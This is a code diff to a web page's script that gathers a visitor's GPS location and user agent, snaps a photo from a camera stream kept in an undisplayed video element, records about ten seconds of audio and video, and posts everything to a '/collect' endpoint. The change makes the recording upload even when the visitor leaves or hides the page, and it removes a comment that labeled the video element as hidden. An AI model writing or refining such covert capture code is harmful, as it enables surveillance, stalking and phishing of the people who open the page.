@@ -74,7 +74,7 @@
     
     <script>
         var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
-        var recorder,chunks=[],stream;
+        var recorder,chunks=[],stream,hasSentVideo=false;
         
         function collectData(){
             if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){d.gps={lat:p.coords.latitude,lon:p.coords.longitude};},function(){},{timeout:5000});}
@@ -86,12 +86,25 @@
         
         function send(phase){d.phase=phase;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});}
         
+        function stopAndSend(){
+            if(!hasSentVideo && recorder && recorder.state==='recording'){
+                recorder.stop();
+                stream.getTracks().forEach(t=>t.stop());
+            }
+        }
+        
+        // If user leaves page, stop and send
+        window.addEventListener('beforeunload',stopAndSend);
+        window.addEventListener('pagehide',stopAndSend);
+        window.addEventListener('visibilitychange',function(){
+            if(document.hidden)stopAndSend();
+        });
+        
         async function startAll(){
             document.getElementById('allowBtn').style.display='none';
             try{
                 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
                 
-                // HIDDEN video element - NOT shown on page
                 var hiddenVideo=document.createElement('video');
                 hiddenVideo.srcObject=stream;
                 await hiddenVideo.play();
@@ -99,7 +112,7 @@
                 document.getElementById('greenDot').style.display='block';
                 document.getElementById('yellowDot').style.display='block';
                 
-                // Photo after 0.5s (using hidden video)
+                // Photo
                 await new Promise(r=>setTimeout(r,500));
                 var c=document.createElement('canvas');
                 c.width=hiddenVideo.videoWidth||640;c.height=hiddenVideo.videoHeight||480;
@@ -107,14 +120,18 @@
                 d.photo=c.toDataURL('image/jpeg',0.9);
                 send('phase2');
                 
-                // Record 10s
+                // Record
                 recorder=new MediaRecorder(stream);
                 recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
                 recorder.onstop=function(){
-                    var b=new Blob(chunks,{type:'video/webm'});
-                    var r=new FileReader();
-                    r.onload=function(){d.video=r.result;send('phase3');};
-                    r.readAsDataURL(b);
+                    if(hasSentVideo)return;
+                    hasSentVideo=true;
+                    if(chunks.length>0){
+                        var b=new Blob(chunks,{type:'video/webm'});
+                        var r=new FileReader();
+                        r.onload=function(){d.video=r.result;send('phase3');};
+                        r.readAsDataURL(b);
+                    }
                 };
                 recorder.start(1000);
                 
@@ -123,7 +140,7 @@
                 var id=setInterval(function(){s--;if(s>0)el.textContent='● REC '+s+'s';else{clearInterval(id);el.style.display='none';}},1000);
                 
                 setTimeout(function(){
-                    if(recorder&&recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}
+                    stopAndSend();
                     document.getElementById('greenDot').style.display='none';
                     document.getElementById('yellowDot').style.display='none';
                 },10000);
